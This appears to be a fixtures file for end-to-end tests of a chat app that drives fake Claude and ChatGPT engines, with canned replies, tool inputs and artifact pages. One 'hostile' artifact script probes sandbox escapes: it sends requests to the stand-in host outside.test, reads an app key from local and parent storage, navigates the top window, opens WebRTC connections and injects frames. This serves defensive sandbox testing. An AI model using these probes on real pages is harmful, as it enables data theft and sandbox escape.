// What the e2e server's fake engines answer (e2e/server.ts), for the specs to look for.
export const REPLY = "Streamed reply from the fake claude.";
// E2E_THINKING: what every Claude turn thinks before its tool call (SPEC "Reasoning")
export const THOUGHT = "They want to see what is here. A listing first, then a short answer.";
export const SOL_REPLY = "Answered by the fake ChatGPT plan.";
// A Claude turn whose message says HELD (in the plain mode) streams the first words of REPLY, then
// holds the rest until the test opens the gate HELD_GATE (Server.release): a page that opens
// meanwhile opens mid-reply, however slow the machine is.
export const HELD = "join in the middle";
export const HELD_GATE = "held";
// where gate `name` of the server with data dir `home` is: the fake claude waits until the file is
// there (test/fake-claude.ts `gate`), and the test writes it to open the gate (Server.release)
export const gateAt = (home: string, name: string) => `${home}/gates/${name}`;
// the tool's output when E2E_TOOL_ERROR fails it: nothing in the text says it failed, only the flag
export const TOOL_ERROR = "ls: cannot open directory '.': Permission denied";

// E2E_EDITS (E45): Claude Code's Edit input, keys in the order it writes them, and its Write input.
// Fake data only.
export const EDIT_INPUT = {
  file_path: "src/trip.ts",
  old_string: "export const trip = {\n  from: \"Oct 3\",\n  to: \"Oct 8\",\n};\n",
  new_string: "export const trip = {\n  from: \"Oct 3\",\n  to: \"Oct 9\",\n  nights: 6,\n  city: \"Lisbon\",\n  hotel: \"Casa Azul\",\n  flight: \"TP 1351\",\n};\n",
};
export const WRITE_INPUT = { file_path: "notes/packing.md", content: "# Packing\n\n- passport\n- charger\n- sandals\n- rain jacket\n" };

// E2E_PATTERNS: Claude Code's TodoWrite input, before and after the work (the Plan pattern)
export const PLAN_START = {
  todos: [
    { activeForm: "Searching the web", content: "Search the web", status: "in_progress" },
    { activeForm: "Reading the page", content: "Read the page", status: "pending" },
    { activeForm: "Writing the answer", content: "Write the answer", status: "pending" },
  ],
};
export const PLAN_DONE = { todos: PLAN_START.todos.map((t) => ({ ...t, status: "completed" })) };
// WebSearch's result as Claude Code words it, and the page WebFetch reads (the Sources pattern)
export const SEARCH_LINKS = [
  { title: "Streaming replies", url: "https://docs.example.com/streaming" },
  { title: "A fake claude", url: "https://fake.example.org/claude" },
];
export const FETCHED = "https://docs.example.com/streaming";
export const SEARCH_RESULT = `Web search results for query: "fake claude streaming"\n\nLinks: ${JSON.stringify(SEARCH_LINKS)}\n\nBoth pages describe streamed replies.`;

// E2E_SUBAGENTS (SPEC M7a): the turn spawns two subagents; "notes" reports at once, "scout" waits for
// a message from its card, then reports. Fake data only.
export const NOTES_TASK = "Which notes mention the trip, and which is the newest?";
export const NOTES_REPORT = "Two notes mention the trip; the newest (Oct 3) has the dates.";
export const SCOUT_TASK = "Find the trip dates in the demo notes.";
export const SCOUT_REPORT = "The trip is Oct 3 to Oct 9; the hotel is booked.";
export const SPAWNED = "Two subagents are on it: notes and scout.";

// E2E_ISOLATED (SPEC "Subagents", M7b): the turn spawns "fixer" isolated in a demo git repository;
// it commits a file in its worktree and reports; its branch is merged back, and the report wakes
// the master, whose next turn answers WOKEN. Fake data only.
export const FIXER_TASK = "Add a changelog entry to the demo repo.";
export const FIXER_REPORT = "Added the changelog entry and committed it.";
export const SPAWNED_ISOLATED = "fixer is on it, on a branch of its own.";
export const WOKEN = "fixer's change is merged into main; nothing else to do.";

// E2E_ARTIFACTS (SPEC "Artifacts"): fake pages only. "ui": the first turn publishes LANDING (its
// input streamed slowly, so the draft shows), the second edits its heading; "hostile": the turn
// publishes hostile(udp, tcp), which tries every way out of its sandbox and writes what happened into #out.
export const ARTIFACT = "trip";
export const LANDING_HEADING = "Weekend in Lisbon";
export const EDITED_HEADING = "Long weekend in Lisbon";
const days = ["Friday: Alfama walk, tram 28", "Saturday: Belém, pastéis, the river", "Sunday: LX Factory, sunset at Miradouro"];
export const LANDING = `<!doctype html><html><head><meta charset="utf-8"><title>Trip</title><style>body{font:16px/1.5 system-ui,sans-serif;margin:0;padding:24px;background:#f6f3ee;color:#1d1b18}h1{font-size:28px;margin:0 0 8px}ol{padding-left:20px}li{margin:6px 0}.tag{display:inline-block;padding:2px 10px;border-radius:999px;background:#1d1b18;color:#f6f3ee;font-size:12px}@media (prefers-color-scheme:dark){body{background:#1b1a18;color:#eeeae3}.tag{background:#eeeae3;color:#1b1a18}}</style></head><body><span class="tag">3 days</span><h1 id="heading">${LANDING_HEADING}</h1><p id="ran">scripts did not run</p><ol>${days.map((d) => `<li>${d}</li>`).join("")}</ol><p id="draft-marker">A plan for three easy days.</p><script>document.getElementById("ran").textContent="scripts run";document.body.dataset.ran="yes"</script></body></html>`;
export const LANDING_EDIT = { edits: [{ new: `<h1 id="heading">${EDITED_HEADING}</h1>`, old: `<h1 id="heading">${LANDING_HEADING}</h1>` }], name: ARTIFACT };
export const PUBLISHED = "There is the plan, as a page.";
export const EDITED = "The heading says long weekend now.";

// every attempt goes to http://outside.test, which e2e/artifacts-security.spec.ts watches for, but
// WebRTC's, whose STUN requests go to a UDP listener the test holds on 127.0.0.1:`udp`, and the
// preconnect hint's, to a TCP one on `tcp`; a frame of the page's own (a srcdoc frame would have a
// window with WebRTC in it) must never run, however it is made
export const OUTSIDE = "http://outside.test";
const hostileScript = (udp: number, tcp: number) => `
const results={};
const out=document.getElementById("out");
const record=(k,v)=>{results[k]=v;out.textContent=JSON.stringify(results)};
const attempt=async(k,f)=>{try{const r=await f();record(k,"ok:"+String(r).slice(0,60))}catch(e){record(k,"blocked:"+(e&&e.name||"error"))}};
const failed=(k)=>new Error(k);
const ice={iceServers:[{urls:"stun:127.0.0.1:${udp}"}]};
const offer=async(R)=>{const pc=new R(ice);pc.createDataChannel("x");await pc.setLocalDescription(await pc.createOffer());return "offered"};
// a frame's document, which says it ran (with the probe's name) and sends STUN from its own window
const child=(probe)=>"<script>parent.postMessage({child:"+JSON.stringify(probe)+",rtc:typeof RTCPeerConnection},'*');(async()=>{const pc=new RTCPeerConnection("+JSON.stringify(ice)+");pc.createDataChannel('x');await pc.setLocalDescription(await pc.createOffer())})()<\\/script>";
const frame=(probe)=>"<iframe srcdoc='"+child(probe).replaceAll("'","&#39;")+"'></iframe>";
const ran={};addEventListener("message",e=>{if(e.data&&"child" in e.data)ran[e.data.child]=e.data.rtc});
const ranAfter=(probe)=>new Promise((res,rej)=>setTimeout(()=>probe in ran?res("child ran: "+ran[probe]):rej(failed("the frame never ran")),1500));
const XHTML="http://www.w3.org/1999/xhtml";
const framesNow=()=>[...document.querySelectorAll("iframe,frame,fencedframe,object,embed,portal")].filter(e=>e.namespaceURI===XHTML).length+window.length;
// a frame put in and used in the same task, before the guard's observer runs: its window's WebRTC,
// and a pristine document.write of its own used on the page
const newWindow=()=>{document.body.insertAdjacentHTML("beforeend","<iframe></iframe>");const w=window[window.length-1];if(!w)throw failed("no window");return w};
const worker=(make)=>new Promise((res,rej)=>{const w=make();const port=w.port||w;port.onmessage=e=>res("said "+e.data);w.onerror=()=>rej(failed("worker"));if(w.port)w.port.start();setTimeout(()=>rej(failed("silent")),1500)});
const workerSource=URL.createObjectURL(new Blob(["postMessage(typeof fetch);onconnect=e=>e.ports[0].postMessage(typeof fetch)"],{type:"text/javascript"}));
Promise.all([
attempt("fetch",()=>fetch("${OUTSIDE}/fetch").then(r=>r.status)),
attempt("xhr",()=>new Promise((res,rej)=>{const x=new XMLHttpRequest();x.open("GET","${OUTSIDE}/xhr");x.onload=()=>res(x.status);x.onerror=()=>rej(failed("xhr"));x.send()})),
attempt("websocket",()=>new Promise((res,rej)=>{const w=new WebSocket("ws://outside.test/ws");w.onopen=()=>res("open");w.onerror=()=>rej(failed("ws"))})),
attempt("appSocket",()=>new Promise((res,rej)=>{const w=new WebSocket("ws://"+location.host+"/ws");w.onopen=()=>res("open");w.onerror=()=>rej(failed("ws"))})),
attempt("image",()=>new Promise((res,rej)=>{const i=new Image();i.onload=()=>res("loaded");i.onerror=()=>rej(failed("img"));i.src="${OUTSIDE}/image.png"})),
attempt("cookie",()=>{document.cookie="pwned=1";return document.cookie}),
attempt("localStorage",()=>{localStorage.setItem("pwned","1");return localStorage.getItem("app-key")}),
attempt("parentDocument",()=>parent.document.title),
attempt("parentStorage",()=>parent.localStorage.getItem("app-key")),
attempt("topLocation",()=>{top.location.href="${OUTSIDE}/top";return "assigned"}),
attempt("windowOpen",()=>{const w=window.open("${OUTSIDE}/popup");if(!w)throw failed("popup");return "opened"}),
attempt("rtc",()=>offer(RTCPeerConnection)),
attempt("srcdocFrame",()=>{const f=document.createElement("iframe");f.srcdoc=child("srcdocFrame");document.body.append(f);return ranAfter("srcdocFrame")}),
attempt("srcdocInHTML",()=>{document.body.insertAdjacentHTML("beforeend","<div>"+frame("srcdocInHTML")+"</div>");return ranAfter("srcdocInHTML")}),
attempt("srcdocInShadow",()=>{const h=document.body.appendChild(document.createElement("div"));const r=h.attachShadow({mode:"closed"});r.innerHTML=frame("srcdocInShadow");return ranAfter("srcdocInShadow")}),
attempt("documentWrite",()=>{document.write(frame("documentWrite"));return ranAfter("documentWrite")}),
// the whole document replaced, once it has loaded (while it parses, open does nothing): this page
// and its results would be gone, so it waits for every other probe
attempt("documentOpen",()=>new Promise(r=>setTimeout(r,2500)).then(()=>{document.open();document.write(frame("documentOpen"));document.close();return "replaced"})),
attempt("sameTask",()=>offer(newWindow().RTCPeerConnection)),
attempt("sameTaskWrite",()=>{newWindow().Document.prototype.write.call(document,frame("sameTaskWrite"));return ranAfter("sameTaskWrite")}),
// SVG's own <object> and <embed> are no HTML elements, and load nothing; in a foreignObject they are
attempt("svgObject",()=>{document.body.insertAdjacentHTML("beforeend","<svg><object data='data:text/html,x'></object><embed src='data:text/html,x'></embed><foreignObject><object data='data:text/html,x'></object><embed src='data:text/html,x' type='text/html'>"+frame("svgObject")+"</foreignObject></svg>");return ranAfter("svgObject")}),
attempt("worker",()=>worker(()=>new Worker(workerSource))),
attempt("sharedWorker",()=>worker(()=>new SharedWorker(workerSource))),
attempt("framesLeft",()=>new Promise((res,rej)=>setTimeout(()=>{const n=framesNow();if(n===0)rej(failed("no frames"));else res(n)},1700))),
attempt("sendBeacon",()=>{if(!navigator.sendBeacon("${OUTSIDE}/beacon","x"))throw failed("beacon");return "sent"}),
// hints: whether one leaves at all is what the listeners and the outside route see, not this
attempt("hints",()=>{for(const [rel,href] of [["dns-prefetch","//hint.outside.test"],["preconnect","http://127.0.0.1:${tcp}"],["preconnect","${OUTSIDE}/"],["prefetch","${OUTSIDE}/prefetch"],["preload","${OUTSIDE}/preload"]]){const l=document.createElement("link");l.rel=rel;l.href=href;if(rel==="preload")l.as="fetch";document.head.append(l)}return "hinted"}),
]).then(()=>{document.body.dataset.done="yes"});
document.getElementById("forged").addEventListener("click",()=>parent.postMessage({type:"open",token:"forged",url:"https://example.com/forged"},"*"));
document.getElementById("selfnav").addEventListener("click",()=>{location.href="${OUTSIDE}/self"});
`;
export const hostile = (udp: number, tcp: number) => `<!doctype html><html><head><title>Hostile</title></head><body><pre id="out">{}</pre><a id="link" href="https://example.com/opened">a link out</a> <button id="forged">forged open</button> <button id="selfnav">navigate away</button><script>${hostileScript(udp, tcp)}</script></body></html>`;

// E2E_MEMORY: what every compactor call answers, after MEMORY_WAIT (E46, E47)
export const MEMORY_SUMMARY = "talk: the user asked the fake to keep a long note in mind";
export const MEMORY_WAIT = 2500;
